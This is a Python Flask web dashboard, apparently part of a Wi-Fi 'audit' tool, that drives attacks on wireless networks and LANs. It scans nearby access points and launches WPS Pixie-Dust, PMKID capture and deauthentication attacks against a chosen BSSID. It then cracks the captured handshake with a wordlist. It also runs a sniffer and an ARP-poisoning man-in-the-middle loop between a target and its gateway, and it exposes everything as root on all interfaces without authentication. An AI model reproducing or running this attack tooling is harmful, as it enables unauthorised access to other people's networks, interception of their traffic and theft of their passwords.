import os
import time
import csv
import subprocess
import threading
from datetime import datetime
from flask import Flask, render_template, request, jsonify

# Importa as funções principais do nosso script anterior (core da ferramenta)
from wifi_auditor import run_command, set_monitor_mode, set_managed_mode, capture_pmkid, capture_handshake, crack_hash, identify_vendor, analyze_vulnerabilities, capture_wps
from dsi_sniffer import DSISniffer, spoof, restore_arp

app = Flask(__name__)

# Variáveis globais de controle de estado
CURRENT_MONITOR_IFACE = None
SCAN_PROCESS = None
CSV_PREFIX = "web_scan_results"
SESSION_LOGS = []

SNIFFER_INSTANCE = None
SPOOF_ACTIVE = False

def add_log(msg, log_type="info", is_command=False):
    timestamp = datetime.now().strftime("%H:%M:%S")
    log_entry = {"time": timestamp, "msg": msg, "type": log_type, "cmd": is_command}
    SESSION_LOGS.append(log_entry)
    print(f"[{timestamp}] [{log_type.upper()}] {msg}")

@app.route('/')
def dashboard():
    return render_template('index.html')

@app.route('/api/logs', methods=['GET'])
def get_logs():
    last_idx = request.args.get('last', default=0, type=int)
    new_logs = SESSION_LOGS[last_idx:]
    return jsonify({"status": "success", "logs": new_logs, "next_idx": len(SESSION_LOGS)})

@app.route('/api/report', methods=['GET'])
def get_report():
    report_html = f"""
    <html>
    <head>
        <title>Relatório Grão-Mestre DSI</title>
        <style>
            body {{ font-family: 'Courier New', monospace; background: #050505; color: #00ff00; padding: 40px; }}
            .report {{ border: 1px solid #00ff00; padding: 30px; box-shadow: 0 0 20px #00ff00; }}
            h1 {{ border-bottom: 2px solid #00ff00; padding-bottom: 10px; text-transform: uppercase; letter-spacing: 3px; }}
            .cmd {{ color: #ff00ff; font-weight: bold; }}
            .info {{ color: #00ccff; }}
            .error {{ color: #ff0033; }}
            .log-line {{ margin-bottom: 8px; border-bottom: 1px solid #111; padding-bottom: 4px; font-size: 0.9em; }}
        </style>
    </head>
    <body>
        <div class="report">
            <h1>Relatório de Operação Wi-Fi - DSI Grão-Mestre</h1>
            <p><strong>Operação executada em:</strong> {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}</p>
            <hr style="border: 0; border-top: 1px solid #333; margin: 20px 0;">
            <h3>HISTÓRICO TÁTICO:</h3>
            <div id="log-content">
                {"".join([f"<div class='log-line {l['type']}'>[{l['time']}] {'[COMANDO] ' if l['cmd'] else ''}{l['msg']}</div>" for l in SESSION_LOGS])}
            </div>
            <p style="margin-top:50px; font-size:0.7em; opacity:0.4;">SISTEMA DE AUDITORIA AUTOMATIZADA DSI v3.5 - TOP SECRET</p>
        </div>
    </body>
    </html>
    """
    return report_html

@app.route('/api/interfaces', methods=['GET'])
def get_interfaces():
    stdout, _ = run_command("iw dev | awk '$1==\"Interface\"{print $2}'")
    interfaces = stdout.split('\n') if stdout else []
    return jsonify({"status": "success", "interfaces": [i for i in interfaces if i], "os_type": "linux"})

@app.route('/api/start_monitor', methods=['POST'])
def start_monitor():
    global CURRENT_MONITOR_IFACE
    iface = request.get_json().get('interface')
    if not iface: return jsonify({"status": "error", "message": "Sem interface."}), 400
    add_log(f"Iniciando isolamento de hardware na interface {iface}", log_type="cmd", is_command=True)
    CURRENT_MONITOR_IFACE = set_monitor_mode(iface)
    if CURRENT_MONITOR_IFACE:
        add_log(f"Sistema pronto. Interface armada: {CURRENT_MONITOR_IFACE}")
        return jsonify({"status": "success", "monitor_interface": CURRENT_MONITOR_IFACE})
    add_log("Falha crítica no Kernel ao tentar armar placa.", log_type="error")
    return jsonify({"status": "error", "message": "Erro de hardware."}), 500

@app.route('/api/start_scan', methods=['POST'])
def start_scan():
    global SCAN_PROCESS, CURRENT_MONITOR_IFACE
    if not CURRENT_MONITOR_IFACE: return jsonify({"status": "error", "message": "Não armado."}), 400
    add_log("Radar de Espectro ACIONADO.", log_type="cmd", is_command=True)
    run_command(f"rm -f {CSV_PREFIX}-01.*")
    cmd = f"airodump-ng --output-format csv -w {CSV_PREFIX} --update 1 {CURRENT_MONITOR_IFACE}"
    SCAN_PROCESS = subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    return jsonify({"status": "success"})

@app.route('/api/stop_scan', methods=['POST'])
def stop_scan():
    global SCAN_PROCESS
    if SCAN_PROCESS:
        add_log("Radar em Standby.", log_type="info")
        SCAN_PROCESS.terminate(); run_command("killall airodump-ng", sudo=True); SCAN_PROCESS = None
    return jsonify({"status": "success"})

@app.route('/api/get_networks', methods=['GET'])
def get_networks():
    csv_file = f"{CSV_PREFIX}-01.csv"
    networks = []
    if os.path.exists(csv_file):
        try:
            with open(csv_file, 'r', encoding='utf-8', errors='ignore') as f:
                reader = csv.reader(f); in_ap = False
                for row in reader:
                    if not row or len(row) < 14: continue
                    if row[0].strip() == "BSSID": in_ap = True; continue
                    if row[0].strip() == "Station MAC": break
                    if in_ap:
                        bssid = row[0].strip(); essid = row[13].strip()
                        if essid and essid != "\x00":
                            networks.append({'bssid': bssid, 'signal': row[8].strip(), 'channel': row[3].strip(), 'privacy': row[5].strip(), 'essid': essid, 'vendor': identify_vendor(bssid)})
        except Exception: pass
    networks.sort(key=lambda x: int(x['signal']) if x['signal'].lstrip('-').isdigit() else -100, reverse=True)
    return jsonify({"status": "success", "networks": networks})

def perform_attack_thread(attack_type, bssid, channel, essid, privacy):
    vendor = identify_vendor(bssid)
    _, advice = analyze_vulnerabilities(vendor, essid, privacy)
    add_log(f"ALVO TRAVADO: {essid} ({vendor})", log_type="cmd", is_command=True)
    add_log(f"ANALÍTICA: {advice}")
    prefix = f"web_capture_{essid.replace(' ', '_')}"
    cap_file = None
    if attack_type == 'wps':
        add_log("Iniciando Incursão WPS Pixie-Dust (Grão-Mestre)...")
        capture_wps(CURRENT_MONITOR_IFACE, bssid, channel)
        return
    if attack_type == 'pmkid':
        add_log("Executando Vetor A: Extração PMKID Stealth...")
        cap_file = capture_pmkid(CURRENT_MONITOR_IFACE, bssid, channel, prefix)
        if not cap_file:
             add_log("PMKID falhou. Acionando Fallback Automático para Deauth...", log_type="error")
             cap_file = capture_handshake(CURRENT_MONITOR_IFACE, bssid, channel, prefix)
    else:
        add_log("Executando Vetor C: Injeção Deauth Agressiva (MDK4)...")
        cap_file = capture_handshake(CURRENT_MONITOR_IFACE, bssid, channel, prefix)

    if cap_file:
        add_log(f"VITÓRIA: Chave retida em {cap_file}")
        wordlist = "/usr/share/wordlists/rockyou.txt"
        if os.path.exists(wordlist):
            add_log(f"Disparando Quebra de Senha (Hashcat/Aircrack)...")
            crack_hash(cap_file, wordlist, bssid)
    else: add_log("DERROTA: O alvo resistiu aos vetores táticos.", log_type="error")

@app.route('/api/attack', methods=['POST'])
def launch_attack():
    global CURRENT_MONITOR_IFACE
    if not CURRENT_MONITOR_IFACE: return jsonify({"status": "error", "message": "Placa não armada."})
    data = request.get_json()
    threading.Thread(target=perform_attack_thread, args=(data['attack_type'], data['bssid'], data['channel'], data['essid'], data.get('privacy',''))).start()
    return jsonify({"status": "success"})

@app.route('/api/restore', methods=['POST'])
def restore():
    global CURRENT_MONITOR_IFACE, SCAN_PROCESS
    add_log("Limpando ambiente e restaurando conexão civil.", log_type="info")
    if SCAN_PROCESS: SCAN_PROCESS.terminate(); run_command("killall airodump-ng", sudo=True); SCAN_PROCESS = None
    if CURRENT_MONITOR_IFACE: set_managed_mode(CURRENT_MONITOR_IFACE); CURRENT_MONITOR_IFACE = None
    return jsonify({"status": "success"})

@app.route('/api/sniff/start', methods=['POST'])
def start_sniff():
    global CURRENT_MONITOR_IFACE, SNIFFER_INSTANCE
    # O Sniffer funciona melhor em modo Managed ou se a interface monitor estiver UP e no canal correto.
    # Vamos usar a interface que estiver disponível.
    iface = CURRENT_MONITOR_IFACE or "wlan0"
    
    if not SNIFFER_INSTANCE:
        SNIFFER_INSTANCE = DSISniffer(iface, log_callback=add_log)
        SNIFFER_INSTANCE.start()
        return jsonify({"status": "success", "message": f"Sniffer Grão-Mestre ativo em {iface}"})
    return jsonify({"status": "error", "message": "Sniffer já está rodando."})

@app.route('/api/sniff/stop', methods=['POST'])
def stop_sniff():
    global SNIFFER_INSTANCE
    if SNIFFER_INSTANCE:
        SNIFFER_INSTANCE.stop()
        SNIFFER_INSTANCE = None
    return jsonify({"status": "success", "message": "Sniffer interrompido."})

@app.route('/api/mitm/start', methods=['POST'])
def start_mitm():
    global SPOOF_ACTIVE
    data = request.get_json()
    target_ip = data.get('target_ip')
    gateway_ip = data.get('gateway_ip')
    
    if not target_ip or not gateway_ip:
        return jsonify({"status": "error", "message": "IPs de Alvo e Gateway necessários."})

    def run_spoof():
        global SPOOF_ACTIVE
        SPOOF_ACTIVE = True
        add_log(f"Iniciando Envenenamento ARP: {target_ip} <-> {gateway_ip}", log_type="cmd", is_command=True)
        try:
            while SPOOF_ACTIVE:
                spoof(target_ip, gateway_ip)
                spoof(gateway_ip, target_ip)
                time.sleep(2)
        except Exception as e:
            add_log(f"Erro no Spoofing: {e}", log_type="error")
            SPOOF_ACTIVE = False

    threading.Thread(target=run_spoof, daemon=True).start()
    return jsonify({"status": "success", "message": "Intercepção MITM em andamento."})

@app.route('/api/mitm/stop', methods=['POST'])
def stop_mitm():
    global SPOOF_ACTIVE
    SPOOF_ACTIVE = False
    return jsonify({"status": "success", "message": "Sinal de parada enviado ao Spoof."})

if __name__ == '__main__':
    if os.geteuid() != 0: exit(1)
    app.run(host='0.0.0.0', port=5000, debug=False, threaded=True)
